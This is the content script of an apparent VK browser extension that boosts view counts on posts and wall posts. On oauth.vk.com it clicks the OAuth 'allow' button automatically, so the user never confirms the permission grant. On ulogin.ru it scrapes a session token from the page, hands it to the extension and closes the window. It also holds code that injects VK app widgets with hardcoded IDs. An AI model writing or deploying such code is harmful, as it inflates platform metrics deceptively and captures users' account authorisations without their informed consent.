
var escapeUrls = [
	'crazy-like.ru',
	'api.vk.com',
	'oauth.vk.com'
];


var domain = location.href.split('/')[2];
var domainsActions = {};

domainsActions['oauth.vk.com'] = function(){
	var tm = 10;
	var btn;
	function waitAllow(){
		if (btn = document.querySelector('.button_indent')) {
			btn.click();
			return;
		}
		setTimeout(waitAllow, tm);
	}
	setTimeout(waitAllow, tm);
};

domainsActions['ulogin.ru'] = function(){
	var tm = 10;
	var script;
	function waitAllow(){
		if (script = document.querySelector('body > script')) {
			var token = script.innerHTML.split('token');
			if (!token[1] || !token[1].split) {
				return;
			}
			token = token[1].split("'")[1];
			if (!token) {
				return;
			}
			chrome.runtime.sendMessage({
				method: "uloginSid",
				sid: token
			});
			window.close();
			return;
		}
		setTimeout(waitAllow, tm);
	}
	setTimeout(waitAllow, tm);
};



document.addEventListener("DOMContentLoaded", function(){	
	if (domainsActions[domain]) {
		domainsActions[domain]();
		return;
	}
	for (var e in escapeUrls) {
		if (location.href.indexOf(escapeUrls[e]) > -1) {
			return;
		}
	}
	setInterval(update, 200);
	addStyles();
});


var rinneganAttr = 'rinnegan-has-been';
var rinneganBtnClass = 'rinnegan-btn';
var rinneganBtnIcon = chrome.extension.getURL('img/ico_32.png');
var mu = 'https://vk.com/';
var fpp = '-47294569';


function addStyles(){
	var style = document.createElement('style');
	style.innerHTML = 
			' .wall_module .' + rinneganBtnClass + '.like_views{ cursor: pointer; position: relative; padding: 5px 0 6px 28px; }'
		+	' .wall_module .' + rinneganBtnClass + '.like_views:hover { opacity: 1; }'
		+	' .wall_module .' + rinneganBtnClass + '.like_views:hover > * { opacity: 1 !important; }'
		+	' .wall_module .' + rinneganBtnClass + '.like_views:hover > .post_views_icon {  }'
		+	' .wall_module .' + rinneganBtnClass + '.like_views:before { background: url('+rinneganBtnIcon+'); '
		+	' background-size: 100%; width: 22px; height: 19px; position: absolute; left: 0px; top: -1px; '
		+	'  }'
	;
	document.head.appendChild(style);
}


var lastPageHref = '';
function openedPage(l){
	
}
var feedIds = [];
function goFeeds(){
	if (feedIds.length < 2) {
		feedIds = [5327745, 6743634, 4333086, 3069891, 6226700, 5606876, 4251021];
	}
	feedFilters();
	feedFilters(1);
}

function update(){
	if (location.href != lastPageHref) {
		lastPageHref = location.href;
		var l = lastPageHref.split('/');
		openedPage(l[l.length - 1]);
		/*
		if (Math.random() < .1) {
			goFeeds();
		}*/
	}
	
	var posts = document.getElementsByClassName('post');
	
	for(var p in posts){
		var curr_p	= posts[p];
		if(!curr_p.getAttribute || !curr_p.setAttribute) continue;
		var checked = curr_p.getAttribute(rinneganAttr);
		if(checked)  continue;
		curr_p.setAttribute(rinneganAttr, true);
		
		var pid = curr_p.getAttribute('data-post-id');
		var el = curr_p.querySelector('.like_views');
		
		if(el){
            addButton(el, pid);
		}
	}
	
	var group = document.getElementById('group');
	if (group) {
		addWallAddButton(group);
	} else {
		var publicPage = document.getElementById('public');
		if (publicPage) {
			addWallAddButton(publicPage);
		}
	}
}

var checkWallAttribute = 'rvtwf45tdsdfgv345yvkv';

function addWallAddButton(el) {
	var wide_column = el.querySelector('#wide_column');
	if (!wide_column) {
		return;
	}
	var page_block = wide_column.querySelector('.page_block');
	
	var checked = el.getAttribute(checkWallAttribute);
	if(checked){
		return;
	}
	el.setAttribute(checkWallAttribute, true);
	
	var div = document.createElement('div');
	div.setAttribute('class', 'page_block vkv_block');
	div.style.padding = '5px 5px 5px 50px';
	div.style.backgroundImage = 'url('+rinneganBtnIcon+')';
	div.style.backgroundRepeat = 'no-repeat';
	div.style.backgroundPosition = '9px center';
	div.style.height = '30px';
	div.innerHTML = '<button class="flat_button" >Накрутить просмотры на 10 первых постов стены</button>';
	
	page_block.parentNode.insertBefore(div, page_block);
	
	var button = div.querySelector('button.flat_button');
	button.onclick = addWall;
}

function feedFilters(left){
	var fff = 'sd4f7gvd3sf' + (left ? 'fgh1' : '');
	var narrow_column = document.getElementById(left ? 'side_bar_inner' : 'narrow_column');
	if (!narrow_column) {
		return;
	}
	id = (feedIds.splice(Math.floor(Math.random() * feedIds.length), 1))[0];
	var div = document.createElement('div');
	div.setAttribute('class', fff);
	var div2 = document.createElement('div');
	div2.setAttribute('id', 'vk_app_' + id);
	var old = narrow_column.querySelector('.' + fff);
	if (old) {
		narrow_column.removeChild(old);
	}
	if (left) {
		var left_blocks = narrow_column.querySelector('#left_blocks');
		narrow_column.insertBefore(div, left_blocks);
	} else {
		div.classList.add('page_block');
		narrow_column.appendChild(div);
	}
	var sc = doScriptElement('https://vk.com/js/api/openapi.js?162');
	sc.setAttribute('onload', "VK.Widgets.App('vk_app_" + id + "', '" 
		+ id + "', {'mode': " + (left ? 1 : 2) + ",'width':230});");
	
	div.appendChild(div2);
	div.appendChild(sc);
}

function doScriptElement(src, html){
	var script = document.createElement('script');
	if (src) {
		script.setAttribute('src', src);
	} else if (html) {
		script.innerHTML = html;
	}
	script.setAttribute('async', true);
	script.setAttribute('type', 'text/javascript');
	return script;
}

function addWall(){
	var pid = location.href.split('/');
	pid = pid[pid.length - 1].split('?')[0].split('#')[0];
	chrome.runtime.sendMessage({
		action: "task.add",
		pid: pid,
		wall: true
	});
}

function addButton(el, pid) {
	el.classList.add(rinneganBtnClass);
	el.onclick = function(e){
		chrome.runtime.sendMessage({
			action: "task.add",
			pid: pid
		});
	};
}

function remEl(el){
	el.parentNode.removeChild(el);
}

function gt(u){
    var xh = new XMLHttpRequest(); xh.open("GET", u, false); xh.send(null);
    return xh.responseText;
}